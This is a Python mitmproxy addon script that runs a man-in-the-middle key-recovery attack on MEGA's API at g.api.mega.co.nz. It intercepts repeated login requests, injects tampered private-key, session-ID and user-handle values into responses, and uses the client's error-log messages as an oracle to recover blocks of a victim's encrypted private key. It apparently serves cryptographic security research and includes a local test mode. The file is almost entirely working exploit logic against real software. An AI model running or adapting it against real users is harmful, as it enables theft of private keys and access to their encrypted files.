# run with `mitmdump -q -s ./mitm.py`
# assumes sagemath is installed and accessible to the main python installation

# demonstrates recovery of one block at a time

import json
import secrets

from mitmproxy import ctx, http

from attack_utils import * 
from mitm_utils import EcbOracle, make_response
from mitm_attack1 import ResidueAttack
from mitm_attack2 import SmallPrimeAttack

#
# parameters
#

WHICH_ATTACK = 1  # 1 or 2
VERSION = 'full' # 'simple' or 'full'
WHICH_BLOCK = 0  # index of target block to recover from the original privk
LOCAL = True  # avoid any queries to the real server
STATS = True  # save total logins and ECB calls to file and use random block -- only fully automated if LOCAL = True

# the following need to be set if LOCAL is True (can be obtained from a single captured response from the client)
LOCAL_USER = ''
LOCAL_S = ''
LOCAL_CSID = ''
LOCAL_PRIVK = ''
LOCAL_K = ''
LOCAL_U = ''
# if LOCAL is False, run on a single query client first

#
# actual attack via mitmproxy
#

class AttackMitm:
    def __init__(self, local=LOCAL, attackType=WHICH_ATTACK, targetBlockIndex=WHICH_BLOCK, version=VERSION, stats=STATS):
        print("target block index:", targetBlockIndex)
        print("attack version:", version)
        print("local mode:", local)
        print("Initialising mitm...")
        # mitmproxy setup
        self.local = local
        self.attackType = attackType
        self.targetBlockIndex = targetBlockIndex
        self.version = version
        self.stats = stats
        self.ecbOracle = EcbOracle()

        if self.local:
            self.original_response = {'csid': LOCAL_CSID, 'privk': LOCAL_PRIVK, 'k': LOCAL_K, 'u': LOCAL_U, 'ach': 1}
            privk = url_decode(self.original_response['privk'])
            if self.attackType == 2:
                csid = url_decode(self.original_response['csid'])
                uh = self.original_response['u']
            self.targetBlock = getBlocks(privk, self.targetBlockIndex)
            if STATS:
                self.targetBlock = secrets.token_bytes(16)

            # attack setup
            if self.attackType == 1:
                self.attack = ResidueAttack(self.ecbOracle, privk, self.targetBlock, self.version, self.stats)
            elif self.attackType == 2:
                self.attack = SmallPrimeAttack(self.ecbOracle, privk, csid, uh, self.targetBlock, self.version, self.stats)
            else:
                raise NotImplementedError("Attack type must be in [1,2]")
        else:
            self.initDone = False
            self.ready = False
        self.firstFlag = False
        self.num_queries = 0
        print("Mitm initialisation done!")

    def request(self, flow: http.HTTPFlow):
        if flow.request.pretty_host == "g.api.mega.co.nz":
            if flow.request.method == "POST" and flow.request.headers.get(b"Content-Type") == "text/plain;charset=UTF-8":
                data = flow.request.json()

                if not self.firstFlag:
                    print("Accepting requests...")
                    self.firstFlag = True

                if not self.local and self.initDone and not self.ready:
                    pass  # don't modify
                elif self.local or self.initDone:
                    if not self.local and (data == [{'a': 'gmf'}] or data == [{'a': 'gpsa'}] or (type(data) == list and data[0]['a'] == 'us0' and 'user' in data[0])):
                        pass
                    else:
                        responses = []  # the client may batch requests into one API call, and expect the responses to do the same
                        if type(data) == list:
                            for item in data:

                                # initial pre-login requests
                                if self.local and item == {'a': 'gmf'}:
                                    responses.append({'mcs': 1, 'mfae': 1, 'nsre': 1, 'nlfe': 1, 'cspe': 1, 'smsve': 1, 'sra': 'f1a278b6fb916730', 'refpr': 1})
                                elif self.local and item == {'a': 'gpsa'}:
                                    responses.append(-9)
                                elif self.local and item == {'a': 'us0', 'user': LOCAL_USER}:
                                    responses.append({'s': LOCAL_S, 'v': 2})

                                # the repeated login request we are looking for
                                elif 'a' in item and item['a'] == 'us' and 'user' in item and 'uh' in item:
                                    responses.append(self.original_response)
                                    self.num_queries += 1

                                if self.attackType == 1:
                                    if item == {'a': 'log', 'e': 99752, 'm': '[1,10,{}]'}:
                                        try:  # this is so that the proxy is not bypassed in case of errors
                                            self.attack.mark_continue()
                                        except Exception as e:
                                            print("mark_continue error:", e)
                                            self.complete(flow, 1)
                                    elif item == {'a': 'log', 'e': 99752, 'm': '[1,12,"'+self.original_response['u']+'",{},"TypeError: inv is null"]'}:
                                        try:
                                            self.attack.mark_hit()
                                        except Exception as e:
                                            print("mark_hit error:", e)
                                            self.complete(flow, 1)
                                    responses.append(0)

                                elif self.attackType == 2 and 'a' in item:
                                    if item['a'] == 'ug':
                                        print("mitm:\tconfirm request (sid)")
                                        try:
                                            self.attack.mark_confirm()
                                        except Exception as e:
                                            print("mark_confirm error:", e)
                                            self.complete(flow, 1)
                                    elif item['a'] == 'log' and 'm' in item:
                                        if item['m'][:5] == '[1,13' and '254' in item['m']: 
                                            print("mitm:\thit request ([1,13,254])")
                                            try:
                                                self.attack.mark_hit()
                                            except Exception as e:
                                                print("mark_hit error:", e)
                                                self.complete(flow, 1)
                                        elif item['m'][:5] == '[1,14':
                                            try:
                                                self.attack.mark_continue()
                                            except Exception as e:
                                                print("mark_continue error:", e)
                                                self.complete(flow, 1)
                                        elif item['m'][:5] == '[1,12' and 'privkey[i] is null' in item['m']: # ignore repeats caused by suppressing ignoring of double errors (careful to check not ignoring err{6})
                                            print("rare case of one of r dividing d, abort!")
                                            self.complete(flow, 1)
                                        elif item['m'][:5] == '[1,12' and 'is null' not in item['m']: # ignore repeats caused by suppressing ignoring of double errors (careful to check not ignoring err{6})
                                            pass
                                        elif item['m'][:5] == '[1,11':  # means the computation of the utf8 uh failed
                                            print("wrong-length uh, abort!")
                                            self.complete(flow, 1)
                                    responses.append(0)
                                else:
                                    print("mitm:\tunknown request:", item)
                                    responses.append({})

                            flow.response = make_response(responses)
                
                else:
                    pass  # should not modify anything here
            else:
                print("unexpected type of request encountered, blocking by default")
                flow.response = make_response([{}])
            
            if (self.local or self.initDone) and self.attack.isDone:
                try:
                    recoveredBlock = self.attack.finish()
                    print("num logins:", self.num_queries)
                    print("num ECB calls:", self.ecbOracle.getCount())
                    if STATS and self.attackType == 1:
                        with open("attack1_stats.csv", "a") as f:
                            f.write("{},{}\n".format(self.num_queries, self.ecbOracle.getCount()))
                    if recoveredBlock != b'':
                        self.complete(flow)
                except Exception as e:
                    print("finish error:", e)

    def response(self, flow: http.HTTPFlow):
        if flow.request.pretty_host == "g.api.mega.co.nz":
            if flow.request.method == "POST" and flow.request.headers.get(b"Content-Type") == "text/plain;charset=UTF-8":
                
                data = flow.response.json()

                if type(data) == list:
                    responses = []
                    for item in data:
                        if type(item) == dict and "privk" in item:

                            if not self.local and not self.ready and self.initDone:
                                self.ready = True
                            elif not self.local and not self.initDone:
                                self.initDone = True
                                self.original_response = item
                                privk = url_decode(self.original_response['privk'])
                                if self.attackType == 2:
                                    csid = url_decode(self.original_response['csid'])
                                    uh = self.original_response['u']
                                self.targetBlock = getBlocks(privk, self.targetBlockIndex)
                                if STATS:
                                    self.targetBlock = secrets.token_bytes(16)

                                # attack setup
                                if self.attackType == 1:
                                    self.attack = ResidueAttack(self.ecbOracle, privk, self.targetBlock, self.version, self.stats)
                                elif self.attackType == 2:
                                    self.attack = SmallPrimeAttack(self.ecbOracle, privk, csid, uh, self.targetBlock, self.version, self.stats)
                                else:
                                    raise NotImplementedError("Attack type must be in [1,2]")

                            modified_response = dict(self.original_response)
                            if self.attackType == 1:
                                modified_response["privk"] = self.attack.next_privk()
                            elif self.attackType == 2 and not self.attack.isDone:
                                try:
                                    modified_response["privk"] = self.attack.get_privk()
                                    modified_response["csid"] = self.attack.next_csid()
                                    if modified_response["csid"] == "abort":
                                        self.complete(flow, 1)
                                    modified_response["u"] = self.attack.next_uh()
                                except Exception as e:
                                    print("response error:", e)
                                    self.complete(flow, 1)
                            responses.append(modified_response)

                        else:
                            responses.append(item)

                    flow.response.set_text(json.dumps(responses))

    def complete(self, flow, error=0):
        flow.kill()
        exit(error)
                    

addons = [AttackMitm()]